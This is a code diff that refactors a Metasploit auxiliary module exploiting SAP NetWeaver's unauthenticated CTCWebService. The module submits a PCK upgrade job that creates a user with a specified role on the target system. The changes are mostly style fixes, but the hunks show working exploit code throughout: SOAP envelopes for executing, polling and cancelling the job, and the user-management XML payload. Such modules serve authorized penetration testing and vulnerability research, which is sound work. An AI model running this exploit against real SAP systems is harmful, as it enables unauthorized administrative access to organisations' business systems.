@@ -10,7 +10,7 @@ class WebServiceSession
   end
 
   def cancel_execution
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
@@ -19,15 +19,15 @@ class WebServiceSession
             </urn:cancelExecution>
          </soapenv:Body>
       </soapenv:Envelope>
-    EOS
+    ENVELOPE
     res = send_request_soap(envelope)
     fail_with(Failure::UnexpectedReply, 'Failed to cancel execution') if res.nil?
 
-    return res.get_xml_document.xpath('//return/text()').to_s != 'false'
+    res.get_xml_document.xpath('//return/text()').to_s != 'false'
   end
 
-  def get_event
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+  def get_event # rubocop:disable Naming/AccessorMethodName
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
@@ -36,15 +36,15 @@ class WebServiceSession
             </urn:getNextEvent>
          </soapenv:Body>
       </soapenv:Envelope>
-    EOS
+    ENVELOPE
     res = send_request_soap(envelope)
     fail_with(Failure::UnexpectedReply, 'Failed to retrieve the event information') if res.nil?
 
-    return Nokogiri::XML(Rex::Text.decode_base64(res.get_xml_document.xpath('//return/text()')))
+    Nokogiri::XML(Rex::Text.decode_base64(res.get_xml_document.xpath('//return/text()')))
   end
 
-  def has_events_available?
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+  def has_events_available? # rubocop:disable Naming/PredicateName
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
@@ -53,11 +53,11 @@ class WebServiceSession
             </urn:eventsAvailable>
          </soapenv:Body>
       </soapenv:Envelope>
-    EOS
+    ENVELOPE
     res = send_request_soap(envelope)
     fail_with(Failure::UnexpectedReply, 'Failed to check if events are available') if res.nil?
 
-    return res.get_xml_document.xpath('//return/text()').to_s != 'false'
+    res.get_xml_document.xpath('//return/text()').to_s != 'false'
   end
 
   attr_reader :session_id
@@ -79,13 +79,13 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'SAP Unauthenticated WebService User Creation',
         'Description' => %q{
           This module leverages an unauthenticated web service to submit a job which will create a user with a specified
-          role. The job involves running a wizard however after the necessary action is taken the job is canceled to avoid
+          role. The job involves running a wizard. After the necessary action is taken, the job is canceled to avoid
           unnecessary system changes.
         },
         'Author' => [
-          'Pablo Artuso',
-          'Dmitry Chastuhin',
-          'Spencer McIntyre'
+          'Pablo Artuso', # The Onapsis Security Researcher who originally found the vulnerability
+          'Dmitry Chastuhin', # Author of one of the early PoCs utilizing CTCWebService
+          'Spencer McIntyre' # This metasploit module
         ],
         'License' => MSF_LICENSE,
         'References' => [
@@ -121,13 +121,12 @@ class MetasploitModule < Msf::Auxiliary
     report_vuln(
       host: rhost,
       port: rport,
-      name: self.name,
+      name: name,
       sname: ssl ? 'https' : 'http',
       proto: 'tcp',
-      :refs => self.references,
-      info: "Module #{self.fullname} successfully submitted a job via the CTCWebService"
+      refs: references,
+      info: "Module #{fullname} successfully submitted a job via the CTCWebService"
     )
-
 
     loop do
       # it's a slow process, wait between status checks
@@ -187,7 +186,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def invoke_pckupgrade
     message = { name: 'Netweaver.PI_PCK.PCK' }
-    message[:data] = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    message[:data] = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <PCK>
         <Usermanagement>
           <SAP_XI_PCK_CONFIG>
@@ -220,9 +219,9 @@ class MetasploitModule < Msf::Auxiliary
           </PCKAdmin>
         </Usermanagement>
       </PCK>
-    EOS
+    ENVELOPE
 
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
         <soapenv:Header/>
         <soapenv:Body>
@@ -238,7 +237,7 @@ class MetasploitModule < Msf::Auxiliary
           </urn:execute>
          </soapenv:Body>
       </soapenv:Envelope>
-    EOS
+    ENVELOPE
 
     res = send_request_soap(envelope)
     fail_with(Failure::UnexpectedReply, 'Failed to start the PCK Upgrade process') unless res&.code == 200
